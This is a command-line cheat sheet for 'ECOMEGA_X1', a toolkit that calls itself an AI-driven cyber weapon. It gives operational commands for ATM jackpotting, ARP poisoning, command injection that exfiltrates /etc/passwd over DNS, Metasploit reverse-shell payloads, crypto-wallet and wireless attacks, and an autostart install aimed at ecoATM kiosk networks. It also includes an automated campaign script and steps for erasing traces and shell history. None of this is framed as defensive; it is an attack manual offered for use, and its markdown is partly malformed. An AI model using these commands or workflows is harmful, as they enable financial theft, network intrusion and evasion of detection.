# 🔴 ECOMEGA_X1 COMMAND LINE CHEAT SHEET
========================================

## The Ultimate AI-Driven Cyber Weapon System Command Reference

### 📁 DIRECTORY STRUCTURE
```
ECOMEGA_X1/
├── deployments/          # Deployment scripts & setup
├── attacks/             # All attack modules & exploits
├── server_listener/     # AI servers & network listeners
├── ECOMEGA_X1_COMMAND_CHEAT_SHEET.md  # This file
└── [documentation files]
```

---

## 🚀 QUICK START COMMANDS

### **System Initialization**
```bash

## 🔧 FIX GIT ISSUES

### 1. Configure Git Identity
```bash
git config --global user.name "OMEGA PLOUTUS X"
git config --global user.email "omega@ploutusx.com"
```

### 2. Add the Missing File
```bash
# Make sure you're in the ECOMEGA_X1 directory
cd ECOMEGA_X1
git add install_autostart.sh
git commit -m "Add missing install_autostart.sh for auto-start installation"
```

### 3. Check Branch Name & Push
```bash
git branch -a
# If on 'main', push to main
git push origin main
```

### 4. Alternative: Check Remote Branches
```bash
git ls-remote --heads origin
```

## 🎯 COMPLETE UPLOAD SEQUENCE
```bash
git config --global user.name "OMEGA PLOUTUS X"
git config --global user.email "omega@ploutusx.com"
cd ECOMEGA_X1
git add install_autostart.sh
git commit -m "Add install_autostart.sh for ecoATM auto-deployment"
git push origin main
```

## 🚀 AFTER SUCCESSFUL PUSH (ecoATM System)
```bash
cd ~/ECOMEGAX1
git pull origin main
chmod +x install_autostart.sh
sudo ./install_autostart.sh
```

## 📊 WHAT THE INSTALLATION DOES
1. ✅ Copies OMEGA to `/opt/omega/`
2. ✅ Installs NetworkManager dispatcher
3. ✅ Sets up systemd auto-start service
4. ✅ Configures auto-deployment on ecoATM WiFi
```

### **Launch Complete System**
```bash
# Compile Linux binaries
make -f deployments/Makefile.linux all

# Launch the full cyber weapon system
sudo ./deployments/launch_omega.sh

# Alternative: Launch AI server only
cd server_listener && python3 omega_ai_server.py

# Launch CLI in another terminal
cd server_listener && python3 omega_cli.py
```

---

## 🎯 ATTACK EXECUTION COMMANDS

### **Interactive Attack Interface**
```bash
# Launch interactive CLI
cd server_listener && python3 omega_cli.py

# CLI Commands:
OMEGA> status              # Show system status
OMEGA> attacks             # List all available attacks
OMEGA> attack <type> [target]  # Execute specific attack
OMEGA> history             # Show attack history
OMEGA> monitor             # Real-time monitoring
```

### **Direct Attack Commands**

#### **Repository-Based Attacks**
```bash
# Metasploit Framework Integration
python3 server_listener/omega_cli.py --attack metasploit_attack --target 192.168.1.100

# Command Injection (PayloadsAllTheThings)
python3 server_listener/omega_cli.py --attack command_injection --target http://vulnerable.com

# ARP Poisoning (APDU Replacement)
python3 server_listener/omega_cli.py --attack arp_poisoning --target 192.168.1.100

# Kiosk Evasion
python3 server_listener/omega_cli.py --attack kiosk_evasion --target localhost

# USB HID Attacks
python3 server_listener/omega_cli.py --attack usb_hid_attack --target usb_device
```

#### **Machine Learning Attacks**
```bash
# Financial ML Analysis
python3 server_listener/omega_cli.py --attack financial_ml --target banking_system

# Deep Learning Attacks
python3 server_listener/omega_cli.py --attack deep_learning --target neural_network

# ML Complete Suite
python3 server_listener/omega_cli.py --attack ml_complete --target dataset
```

#### **Specialized Attacks**
```bash
# ATM Jackpot Sequence
python3 server_listener/omega_cli.py --attack atm_jackpot --target bank_terminal

# Cryptocurrency Exploitation
python3 server_listener/omega_cli.py --attack crypto_wallet --target wallet_file

# Wireless MITM
python3 server_listener/omega_cli.py --attack wireless_mitm --target wifi_network

# Bluetooth Exploitation
python3 server_listener/omega_cli.py --attack bluetooth_attack --target bt_device
```

---

## 🛠️ DEVELOPMENT & TESTING COMMANDS

### **Metasploit Integration Testing**
```bash
# Test Metasploit Framework
cd attacks && python3 metasploit_omega_integration.py --scan --target 192.168.1.0/24

# Generate Metasploit payload
cd attacks && python3 metasploit_omega_integration.py --payload windows/meterpreter/reverse_tcp

# List active sessions
cd attacks && python3 metasploit_omega_integration.py --sessions
```

### **Command Injection Testing**
```bash
# Test polyglot injections
cd attacks && python3 command_injection_omega.py --url http://target.com --param cmd --polyglot

# DNS-based exfiltration
cd attacks && python3 command_injection_omega.py --url http://target.com --param cmd --exfiltrate "/etc/passwd" --method dns

# Time-based exfiltration
cd attacks && python3 command_injection_omega.py --url http://target.com --param cmd --exfiltrate "/etc/passwd" --method time
```

### **ARP Poisoning Commands**
```bash
# ARP poisoning attack
cd attacks && python3 arp_poisoning_implementation.py --victim 192.168.1.100 --gateway 192.168.1.1

# Network-wide ARP attack
cd attacks && python3 arp_poisoning_implementation.py --network 192.168.1.0/24
```

---

## 🔧 SERVER & LISTENER COMMANDS

### **AI Server Management**
```bash
# Start AI server
cd server_listener && python3 omega_ai_server.py

# Start AI server in background
cd server_listener && python3 omega_ai_server.py &

# Check AI server status
curl http://localhost:31337/health 2>/dev/null || echo "Server not running"
```

### **Evolution Monitor**
```bash
# Start evolution monitoring
cd server_listener && python3 omega_evolution_monitor.py

# Demo evolution monitor
cd server_listener && python3 demo_omega_monitor.py
```

### **Proxy & Network Tools**
```bash
# Scan for proxy servers
cd server_listener && python3 scan_proxy_ports.py

# Test proxy traffic
cd server_listener && python3 proxy_traffic_test.py

# Full proxy probe
cd server_listener && python3 proxy_probe_full.py
```

---

## 📊 MONITORING & DIAGNOSTIC COMMANDS

### **System Status**
```bash
# Quick system check
cd server_listener && python3 omega_cli.py --status

# Real-time monitoring
cd server_listener && python3 omega_cli.py --monitor

# List all attacks
cd server_listener && python3 omega_cli.py --list-attacks
```

### **Log Analysis**
```bash
# View AI server logs
tail -f server_listener/omega_ai_server.log

# View evolution logs
tail -f server_listener/omega_evolution_monitor.log

# View launcher logs
tail -f server_listener/omega_ploutus_launcher.log
```

### **Performance Testing**
```bash
# Run integration tests
sudo ./deployments/test_linux_integration.sh

# Test AI components
cd server_listener && python3 test_omega_monitor.py

# Test integration
cd server_listener && python3 test_integration.py
```

---

## 🎮 ADVANCED USAGE COMMANDS

### **Custom Attack Development**
```bash
# Create custom attack module
# Edit attacks/your_custom_attack.py
# Add to omega_cli.py available_attacks dict
# Test with: python3 omega_cli.py --attack your_custom_attack
```

### **Multi-Target Campaigns**
```bash
# Chain multiple attacks
python3 omega_cli.py --attack metasploit_attack --target target1 &
python3 omega_cli.py --attack command_injection --target target2 &
python3 omega_cli.py --attack arp_poisoning --target target3 &
```

### **Automated Campaigns**
```bash
# Create automation script
cat > auto_campaign.sh << 'EOF'
#!/bin/bash
echo "Starting ECOMEGA_X1 Automated Campaign..."

# Reconnaissance phase
python3 omega_cli.py --attack network_scan --target 192.168.1.0/24

# Attack phase
python3 omega_cli.py --attack metasploit_attack --target vulnerable_host
python3 omega_cli.py --attack command_injection --target web_app

# Exfiltration phase
python3 command_injection_omega.py --exfiltrate --method dns

echo "Campaign completed."
EOF

chmod +x auto_campaign.sh
./auto_campaign.sh
```

---

## 🛡️ DEFENSIVE & CLEANUP COMMANDS

### **System Cleanup**
```bash
# Erase attack traces
cd attacks && python3 omega_ploutus_ai_integration_linux.c  # Run cleanup functions

# Kill all processes
pkill -f omega
pkill -f metasploit
pkill -f python3

# Clean logs
rm -f *.log
rm -f server_listener/*.log
```

### **Emergency Shutdown**
```bash
# Kill all ECOMEGA_X1 processes
pkill -9 -f "omega\|metasploit\|arp_poisoning\|command_injection"

# Stop services
sudo systemctl stop postgresql 2>/dev/null || true

# Clean network interfaces
sudo ifconfig eth0 down && sudo ifconfig eth0 up
```

---

## 📈 TROUBLESHOOTING COMMANDS

### **Common Issues**
```bash
# Permission denied
sudo chmod +x deployments/*.sh
sudo chmod +x server_listener/*.py
sudo chmod +x attacks/*.py

# Port already in use
sudo lsof -i :31337
sudo kill -9 $(sudo lsof -t -i :31337)

# Missing dependencies
sudo apt-get install -y build-essential gcc make python3 python3-pip postgresql postgresql-contrib

# Metasploit issues
cd attacks/new_integrations/metasploit-framework
./msfconsole --version
```

### **Debug Mode**
```bash
# Run with verbose logging
cd server_listener && PYTHONPATH=. python3 -v omega_ai_server.py

# Debug CLI
cd server_listener && python3 -c "import omega_cli; cli = omega_cli.OmegaCLI(); cli.do_status('')"
```

---

## 🎯 LIVE TESTING DEMONSTRATION

### **Test 1: System Status Check**
```bash
cd server_listener
python3 omega_cli.py --status
# Expected: Shows AI server status and available attacks
```

### **Test 2: List Available Attacks**
```bash
cd server_listener
python3 omega_cli.py --list-attacks
# Expected: Shows 26+ attack types organized by category
```

### **Test 3: Metasploit Integration Test**
```bash
cd attacks
python3 metasploit_omega_integration.py --scan --target 127.0.0.1
# Expected: Metasploit loads and attempts basic scan
```

### **Test 4: Command Injection Test**
```bash
cd attacks
python3 command_injection_omega.py --url http://httpbin.org --param url --command "whoami"
# Expected: Attempts command injection on test endpoint
```

### **Test 5: ARP Poisoning Test**
```bash
cd attacks
python3 arp_poisoning_implementation.py --network 127.0.0.1/32
# Expected: ARP poisoning module initializes (may fail without root)
```

### **Test 6: Full System Integration**
```bash
# Start AI server in background
cd server_listener && python3 omega_ai_server.py &

# Test CLI connection
cd server_listener && python3 omega_cli.py --attack kiosk_evasion --target localhost

# Check results
tail -f omega_ai_server.log
```

---

## 🔥 QUICK REFERENCE

### **Most Used Commands**
```bash
# Start everything
sudo ./deployments/launch_omega.sh

# Interactive control
cd server_listener && python3 omega_cli.py

# Quick attack
python3 omega_cli.py --attack metasploit_attack --target <IP>

# Check status
python3 omega_cli.py --status
```

### **Emergency Commands**
```bash
# Stop everything
pkill -9 -f omega
pkill -9 -f metasploit

# Clean up
rm -f *.log
history -c
```

**ECOMEGA_X1: The most dangerous command-line cyber weapon ever created.** 🔴💀
